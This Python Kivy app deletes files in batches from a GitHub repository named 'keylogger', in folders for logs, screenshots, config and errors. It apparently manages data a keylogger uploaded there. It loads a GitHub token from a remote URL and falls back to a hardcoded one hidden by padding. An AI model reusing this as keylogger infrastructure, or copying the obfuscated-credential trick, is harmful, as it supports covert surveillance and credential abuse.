import os
import time
import requests
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.checkbox import CheckBox
from kivy.uix.textinput import TextInput
from kivy.uix.progressbar import ProgressBar
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.core.window import Window
from plyer import notification

# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
DEFAULT_TOKEN = "asdfg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aefthu"

# Function to fetch and process the token
def get_token():
    try:
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()
            if "delete" in token_data:
                token = token_data["delete"]
                processed_token = token[5:-6]
                return processed_token
        print("Using default token.")
    except Exception as e:
        print(f"Error fetching token: {e}")
    return DEFAULT_TOKEN[5:-6]

GITHUB_TOKEN = get_token()

# Replace these with your GitHub details
API_KEY = GITHUB_TOKEN
OWNER = "bebedudu"
REPO = "keylogger"
HEADERS = {
    "Authorization": f"token {API_KEY}",
    "Accept": "application/vnd.github.v3+json"
}
APP_NAME = "DeleteGUI"

# Folders to manage
FOLDERS = ["uploads/cache", "uploads/config", "uploads/keylogerror", "uploads/logs", "uploads/screenshots"]

def get_files(folder_path):
    """Fetch the list of files in a folder."""
    url = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{folder_path}"
    response = requests.get(url, headers=HEADERS)
    response.raise_for_status()
    return response.json()

def delete_file(file_path, sha):
    """Delete a file from GitHub."""
    url = f"https://api.github.com/repos/{OWNER}/{REPO}/contents/{file_path}"
    payload = {
        "message": f"Deleting {file_path}",
        "sha": sha
    }
    response = requests.delete(url, headers=HEADERS, json=payload)
    response.raise_for_status()

def show_notification(title, message):
    """Show a system notification."""
    try:
        notification.notify(
            title=title,
            message=message,
            app_name=APP_NAME,
            timeout=3
        )
    except Exception as e:
        print(f"Notification Error: {e}")

class FolderWidget(BoxLayout):
    """Custom widget for each folder."""
    def __init__(self, folder, **kwargs):
        super().__init__(**kwargs)
        self.folder = folder
        self.orientation = "horizontal"
        self.size_hint_y = None
        self.height = 50

        # Checkbox
        self.checkbox = CheckBox(size_hint_x=0.2)
        self.add_widget(self.checkbox)

        # Folder label
        self.label = Label(text=folder, size_hint_x=0.3)
        self.add_widget(self.label)

        # File count input
        self.entry = TextInput(text="0", size_hint_x=0.2, multiline=False)
        self.add_widget(self.entry)

        # Progress bar
        self.progress = ProgressBar(max=100, size_hint_x=0.3)
        self.add_widget(self.progress)

class MainApp(App):
    def build(self):
        self.title = "GitHub Folder File Manager"
        self.root = BoxLayout(orientation="vertical", padding=10, spacing=10)

        # Title
        self.root.add_widget(Label(text="GitHub Folder File Manager", font_size=24))

        # Folder widgets
        self.folder_widgets = []
        for folder in FOLDERS:
            folder_widget = FolderWidget(folder)
            self.root.add_widget(folder_widget)
            self.folder_widgets.append(folder_widget)

        # Log area
        self.log_area = ScrollView(size_hint=(1, 0.4))
        self.log_layout = GridLayout(cols=1, size_hint_y=None)
        self.log_layout.bind(minimum_height=self.log_layout.setter("height"))
        self.log_area.add_widget(self.log_layout)
        self.root.add_widget(self.log_area)

        # Buttons
        button_layout = BoxLayout(size_hint_y=0.1, spacing=10)
        count_button = Button(text="Count Files", on_press=self.perform_count)
        delete_button = Button(text="Delete Files", on_press=self.perform_delete)
        button_layout.add_widget(count_button)
        button_layout.add_widget(delete_button)
        self.root.add_widget(button_layout)

        return self.root

    def perform_count(self, instance):
        """Count files for selected folders."""
        for folder_widget in self.folder_widgets:
            if folder_widget.checkbox.active:
                threading.Thread(target=self.count_files, args=(folder_widget,)).start()

    def count_files(self, folder_widget):
        """Count files in a folder and update the label."""
        try:
            files = get_files(folder_widget.folder)
            folder_widget.label.text = f"{len(files)} files"
        except Exception as e:
            folder_widget.label.text = "Error"
            show_notification(APP_NAME, f"Failed to count files in '{folder_widget.folder}': {e}")

    def perform_delete(self, instance):
        """Delete files for selected folders concurrently."""
        for folder_widget in self.folder_widgets:
            if folder_widget.checkbox.active:
                try:
                    num_files = int(folder_widget.entry.text)
                    if num_files <= 0:
                        raise ValueError
                except ValueError:
                    show_notification(APP_NAME, f"Invalid number of files for '{folder_widget.folder}'")
                    continue

                threading.Thread(target=self.delete_files, args=(folder_widget, num_files)).start()

    def delete_files(self, folder_widget, num_files):
        """Delete the specified number of files in a folder."""
        try:
            files = get_files(folder_widget.folder)[:num_files]
            total_files = len(files)
            if total_files == 0:
                self.log(f"No files found in {folder_widget.folder}")
                return

            for i, file in enumerate(files, 1):
                delete_file(file["path"], file["sha"])
                self.log(f"Deleted: {file['path']}")

                # Update progress bar
                progress_value = int((i / total_files) * 100)
                folder_widget.progress.value = progress_value
                folder_widget.label.text = f"Deleting... ({i}/{total_files})"
                time.sleep(0.2)

            folder_widget.label.text = "Completed"
            show_notification(APP_NAME, f"The selected files in '{folder_widget.folder}' have been deleted.")
        except Exception as e:
            self.log(f"Error deleting files in '{folder_widget.folder}': {e}")
        finally:
            folder_widget.progress.value = 0

    def log(self, message):
        """Add a message to the log area."""
        self.log_layout.add_widget(Label(text=message, size_hint_y=None, height=30))
        self.log_area.scroll_to(self.log_layout.children[0])

# Run the app
if __name__ == "__main__":
    MainApp().run()